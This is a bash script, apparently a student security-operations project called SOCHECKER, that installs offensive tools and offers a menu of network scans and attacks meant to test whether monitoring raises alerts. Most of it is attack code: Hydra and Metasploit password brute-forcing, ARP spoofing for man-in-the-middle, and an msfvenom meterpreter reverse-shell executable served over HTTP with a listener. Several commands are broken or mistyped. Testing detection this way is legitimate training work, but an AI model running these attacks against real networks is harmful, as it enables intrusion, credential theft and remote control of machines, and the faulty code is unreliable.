#!/bin/bash


# - SOC PROJECT
    
    #~ Title: SOCHECKER
    #~ Create a script that runs different cyber attacks in a given network to check if monitoring alerts appear.
    
    #~ 1. Installing applications
        #~ - Install relevant applications on the local computer.
    #~ 2. Execute network scans and attacks
        #~ - Give the user to choose from two methods of scanning and two different network attacks to run via your script.
        #~ Available tools: nmap, masscan, msfconsole
        #~ - Give user OPTIONS to choose 2 scans and attacks
            
            #~ Attacks:
            #~ 1. Hydra
            #~ 2. MitM
            #~ 3. Responder
            #~ 4. Msfconsole (Recording) 
    #~ 3. Log executed Attacks
        #~ - Every scan or attack should be logged and saved with the date, time, IPs and used arguments.
        #~ - Auth.log (as example/ reference)
            #~ 1. Date Time Action Result 
            #~ 2. Save these information into a log file everytime a scan or attack is done 
            #~ 3. Note: Results and Logs should be separated 
        #~ - At the end give the user a choice to view the results file or log file

#Skeleton of the 

#~ menu -> scan -> nmap			->scan results 
			 #~ -> msfconsole	->scan logs
			 
	 #~ -> attack -> hydra  -> attack logs
			   #~ -> MITM 	-> attack results



## to have a sense of what we have, we just update and upgrade the kali to ensure that the kali is up to date
### Recycled codes from NR PROJ
function forupdate()
	{
		sudo apt-get -y update 
		sudo apt-get -y upgrade
	}

function crefldr()
	{
		mkdir SOCprobase
		cd SOCprobase
	}

# Installing the tools for the job
# list of tools we will need for this project
# Geany, curl, whois, net tools, e
## Having a title at the start of each command, 
## helps the user to identify which part of of the script have gone wrong 
## or any error in the code.
### Also, even if the tools is already installed, we can make sure that they are updated using this method 
### as the apt-get install will also check the version of the tools and do an update if required. 
### Recycled codes from NR PROJ

function instools()
{
	echo "Installing the tools for the job"
	echo "-----Installing GEANY-----"
	sudo apt-get install -y geany
	echo "-----Installing CURL-----"
	sudo apt-get install curl
	echo "-----Installing whois-----"
	sudo apt-get install whois
	echo "-----Installing SSHPASS-----"
	sudo apt-get install net-tools
	echo "-----Removing files that are not required-----"
	sudo apt autoremove
	echo "----------------------------------------------"
	
}

function inscanner()
{
	echo "-----Installing NMAP-----"
	sudo apt-get install -y nmap
	echo "-----Installing masscan-----"
	sudo apt-get install -y masscan
	echo "-----Installing msfconsole-----"
	sudo apt-get install -y msfconsole
}	

function inspayloads
{
	echo "-----Installing msfconsole-----"
	sudo apt-get install -y dsniff
	echo "-----Installing msfconsole-----"
	sudo apt-get install -y 
}
# the scan type functions

function choosescantype()
	{
		
		echo " what kind of scan would you like to do ?: nmap, masscan or msfconsole?"
			read scanmeth
				if [ $scanmeth == nmap ]
				then 
				scannernmap
				fi
				
				if [ $scanmeth == msfconsole ]
				then 
				scannermsf
				fi
				
				if [ $scanmeth == masscan ]
				then 
				scannerms
				fi
			
	}
	
#function to automate the nmap process
function scannernmap()
	{
		echo "Starting NMAP, what IP would you like to scan ?"
		read tarip
		nmap $tarip -oG nmap_results.txt
		lognmap
	}
function scannerms()
	{
		echo "Starting MASSCAN, what IP would you like to scan ?"
		read tarip
		echo "Please Indicate what ports you would like to scan for: format XXXX-XXXX"
		read tarports
		sudo masscan $tarip -p$tarports >> masscan_results.txt
		echo "$now ; masscan; $tarip -p 80" >> masscan_log.txt
	}
	
function scannermsf()
	{
		
		echo 'use auxillary/scanner/smb/smb_login' > scanner_msf.rc
		echo 'set rhost to $tarip' >> scanner_msf.rc
		echo 'set user_file urid.lst' >> scanner_msf.rc
		echo 'set pass_file pass.lst' >> scanner_msf.rc
		echo 'run' >> scanner_msf.rc
		echo 'exit' >> scanner_msf.rc
		
		msfconsole -r scanner_msf.rc -o 
	}
	
# The Attack type functions	
	
function chooseattacktype()
	{
		echo " Hydra, msfconsole or mitm?"
			read atkmeth
			if [ $atkmeth == Hydra ]
			then 
			attackhydra
		fi
			if [ $atkmeth == msfconsole ]
			then 
			attackmsf
		fi
			if [ $atkmeth == mitm ]
			then 
			echo "currently not ready yet"
		fi
	}	

function attackhydra()
{
	echo "please provide the following information"
			echo "what is the userID?"
			read urid
			echo "what is the Password?"
			read urpw
			echo "what is the Service name?"
			read ursve
			echo "what is the IP address?"
			read urip
			hydra  -l urid -p urpw $urip $ursve -vV
			echo "$now ; hydra ; $tarip -l $urid -p $urpw $urip $ursve" >> hydra_log.txt
}	

#~ This function is still in the works as I will be incorporating a case and a way to input a user generated file with the relevant info 

#~ function attackmultihydra()
#~ {
	#~ echo "please provide the following information"
			#~ echo "what is the userID?"
			#~ read urid
			#~ echo $urid >> urid.lst
			#~ echo "what is the Password?"
			#~ read urpw
			#~ echo $urpw >> urpw.lst
			#~ echo "what is the Service name?"
			#~ read ursve
			#~ echo "what is the IP address?"
			#~ read urip
			#~ hydra  -l urid.lst -p urpw.lst $urip $ursve -vV
			
#~ }

#To use MITM, you are required to use 3 machines, attacker, victim and router
function attackmitm()
{
		sudo apt-get install dsniff
		# the above is to ensure that the application is installed
		sudo -i
		echo "what is the router IP address?"
		read 
		echo '1' > /proc/sys/net/ipv4/ip_forward
		
		arpspoof -t $routerip $atarip
		
}

function attackmsf()
	{
		# create a reverse payload
		echo "What is the host IP?"
		read hostIP
		echo "What is the target IP?"
		read tarip
		
		msfvenom -p multi/meterpreter/reverse_http lhost=$hostIP lport=8282 -f exe -o rev8282.exe 
		
		# to create the listener by creating a resource file and appending the commands into the resource file
		echo 'use exploit/multi/handle' > attack_msf.rc
		echo 'set payload payload/multi/meterpreter/reverse_http' >> attack_msf.rc
		echo 'set lhost to $tarip' >> attack_msf.rc
		echo 'set lport to 8282' >> attack_msf.rc
		echo 'run' >> attack_msf.rc
		echo 'exit' >> attack_msf.rc
		
		# the command below runs the script above, specifically with the -r arguement.
		msfconsole -r attack_msf.rc -o amsf_results.txt
		logamsf
		echo "Press ctrl + c to stop listening"
		sudo python3 -m http.server 8282	
	}
## Logging Script
# credit: https://www.tutorialkart.com/bash-shell-scripting/write-output-of-bash-command-to-log-file-example/
#using the selection loop, wer are able to create a simple menu as part of the case syntax

now=$(date)

function lognmap()
{
 
nlog=nmap_log.txt

# append date to log file
date >> $nlog
whoami >> $nlog
# append the relevant data to log file
	echo "$now : nmap : $tarip " >> $nlog
	
}

function logmasscan()
{
	mlog=masscan_log.txt

# append date to log file
	date >> $mlog
 
# append current user into log
	whoami >> $mlog
	
# append the data to log file for nmap
	echo "$now : masscan : $tarip -p80 " >> $slog
}

function logamsf()
{
	amslog=amsf_log.txt
 
# append current user into log
	whoami >> $amslog
	
# append the data to log file for nmap
	echo "$now : msf : $tarip : -r attack_msf.rc -o amsf_results.txt " >> $amslog
}

function loghydra()
{
	hlog=hydra_log.txt
 
# create log file or overrite if already present
	printf "hydra_log - " > $hlog
 
# append current user into log
	whoami >> $hlog
	
# append the data to log file for nmap
	echo "$now : hydra : $tarip" >> $hlog
}

function logmitm()
{
	milog=mitm_log.txt
 
# create log file or overrite if already present
	printf "mitm_log - " > $milog
 
# append date to log file
	date >> $milog
 
# append current user into log
	whoami >> $milog
	
# append the data to log file for nmap
	echo "mitm: $tarip" >> $milog
}

#-----------------------functions end--------------------------#
#-----------------------Start of Script------------------------#

#~ So at the very biginning, we will create a folder to contain all the activity that will happen within this script

# force an update of everything on the computer 
forupdate
instools
inscanner
# Create a container to contain the script.
crefldr
pwd
ifconfig



# Step 2 start the menu to choose between scan and attack
## Most of the code will be within this Menu as the selection will be the the skeleton of the script
# First, we will create the passd.lst and userid.lst to use to simulate everything.
crunch 4 4 kali > pass.lst
crunch 4 4 kali > urid.lst

#~ echo " Do you have some other userid you would like to try?"
#~ read adduser
#~ echo $adduser >> urid.lst

#~ echo " Do you have some other passwords you would like to try?"
#~ read addpass
#~ echo $addpass >> pass.lst

echo "--------------------Initialization completed--------------------"

#I decided to omit the above code as at the moment, I have little time left to finish the code for submission.


# secondly we will establish our target. for this case, I would be using the IP of another machine
## however, this script can be used by inserting the target's information 
#~ echo " what is the target IP?"
#~ read tarip

#~ Startmenu="What would you like to do? : "
#~ echo $Startmenu

read -p "What would you like to do? A) Scan, B) Attack, C) View logs, D) View Results or Quit  " job
    case $job in
        A)
            choosescantype 
            ;;
        B)
            chooseattacktype 
            ;;
        Quit)
           echo "JOB's DONE"
			;;
		D)
			read -p "what results would you like to view? nmap, masscan, msfconsole or hydra " viewR
			case $viewR in
				nmap)
						cat nmap_results.txt
				;;
				masscan)
						cat masscan_results.txt
				;;
				msfconsole)
						cat amsf_results.txt
				;;
				hydra)
						cat hydra_results.txt
				;;
				esac
			;;
				
		C)
			read -p "what Logs would you like to view? nmap, masscan, msfconsole or hydra " viewL
			case $viewL in
				nmap)
						cat nmap_log.txt
				;;
				masscan)192.168.75.138
						cat masscan_log.txt
				;;
				msfconsole)
						cat amsf_log.txt
				;;
				hydra)
						cat hydra_log.txt
				;;
				esac
			
			;;
    esac
pwd

#credits
# the date time command: https://www.cyberciti.biz/faq/unix-linux-getting-current-date-in-bash-ksh-shell-script/
# the logging script: https://www.tutorialkart.com/bash-shell-scripting/write-output-of-bash-command-to-log-file-example/
